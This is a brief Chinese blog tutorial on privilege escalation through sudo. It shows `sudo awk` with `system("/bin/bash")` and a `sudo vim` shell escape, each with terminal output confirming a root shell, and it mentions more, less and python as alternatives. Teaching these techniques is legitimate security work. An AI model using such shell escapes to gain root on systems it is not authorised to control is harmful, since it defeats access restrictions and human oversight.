+++
categories = ["Linux"]
date = "2020-04-10"
description = "Linux下利用sudo实现提权"
tags = ["Linux"]
title = "Linux下利用sudo实现提权"
url = "/linux/linux_sudo/"
+++

> sudo 是常用的 Linux 系统命令，允许普通用户执行 root 命令  
> 此时普通用户就可以利用 sudo 来实现提权，使自己拥有 root 权限

1. 利用awk命令 sudo awk 'BEGIN {system("/bin/bash")}'
> ```
> fancy@raspberrypi:~ $ sudo awk 'BEGIN {system("/bin/bash")}'
> [sudo] fancy 的密码：
> root@raspberrypi:/home/fancy# id    //此处已经实现提权
> uid=0(root) gid=0(root) 组=0(root)
> root@raspberrypi:/home/fancy# exit
> exit
> fancy@raspberrypi:~ $ 
> 
> ```

2. 利用vim工具，sudo vim打开后输入命令:!/bin/bash 即可
> ```
> fancy@raspberrypi:~ $ sudo vim
> :!/bin/bash
> root@raspberrypi:/home/fancy# id    //此处实现提权
> uid=0(root) gid=0(root) 组=0(root)
> root@raspberrypi:/home/fancy# exit
> exit
> ```

3. 以上介绍两种最简单的方法，还有很多类似的方法，如more，less命令，python脚本等等都可以
